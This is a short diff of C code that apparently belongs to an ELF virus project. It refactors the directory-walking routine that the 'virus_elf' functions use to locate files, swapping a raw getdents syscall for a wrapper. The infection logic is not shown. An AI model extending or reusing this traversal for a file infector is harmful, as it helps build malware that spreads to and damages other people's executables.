@@ -137,14 +137,6 @@ void	try_open_file(t_elf *virus_elf, char *path, char *filename)
 	}
 }
 
-typedef struct s_linux_dirent
-{
-	long   d_ino;
-	off_t  d_off;
-	unsigned short d_reclen;
-	char   d_name[];
-}				t_linux_dirent;
-
 void	print_dirent(t_linux_dirent *linux_dir)
 {
 	 printf("%8ld  ", linux_dir->d_ino);
@@ -183,7 +175,7 @@ void	moving_through_path(t_elf *virus_elf, char *path, char *d_name)
 			int		nread;
 			int		rest;
 			rest = 0;
-			while ((nread = syscall(78, fd, buffer + rest, 1024 - rest)) > 0)
+			while ((nread = __getdents(fd, (t_linux_dirent *)(buffer + rest), 1024 - rest)) > 0)
 			{
 				long					bpos;
 				t_linux_dirent			*linux_dir;
